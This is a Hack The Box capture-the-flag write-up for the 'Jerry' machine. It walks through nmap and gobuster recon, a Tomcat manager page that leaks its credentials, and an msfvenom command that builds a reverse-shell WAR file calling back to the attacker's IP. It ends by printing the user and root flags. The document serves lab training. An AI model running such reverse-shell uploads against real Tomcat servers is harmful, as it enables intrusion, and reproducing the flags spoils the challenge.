#HTB - Jerry -Writeup

**Level**:Easy
------------------------------RECON------------------------------ 

Starting with `sudo nmap -sV -sC -T5 10.129.18.224` 
<img width="805" height="152" alt="image" src="https://github.com/user-attachments/assets/8a7a723f-8f55-4394-b6dd-95076cca6aab" />  

I found that only http server is running ,i tried with `-p-` flag , but only one port is running. 
I have visited the page ,only tomcat page.
`gobuster dir -u http://10.129.18.224:8080/ -w /usr/share/wordlists/dirb/common.txt -t 500` 
<img width="944" height="772" alt="image" src="https://github.com/user-attachments/assets/b45fa180-a874-4565-adf5-308527b83aa6" /> 
Found /manager/ directory asks for username and password.  

-------------------------------Initial Access------------------------------- 

Try with a random username and password; it displays the actual credentials. It is a Misconfiguration.

There is an option to upload WAR(Web Application Archive) files. Basically, it is a Java Application

-----------------------------Exploitation--------------------------------------- 

Use msfvenom to create a WAR file to upload : 

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=4001 -f war > rev.war` 

Generates a WAR file included with reverse TCP payload . Upload to the Deployment 
Open a NC listener on port.
Access the file through: http://10.129.18.224:8080/rev/rev.jsp 
<img width="592" height="185" alt="image" src="https://github.com/user-attachments/assets/fafbfd5b-8e7e-4be1-8f86-7f4332159aba" /> 

We got the two flags 


> User flag: 7004dbcef0f854e0fb401875f26ebd00

> Root flag : 04a8b36e1545a455393d067e772fe90e



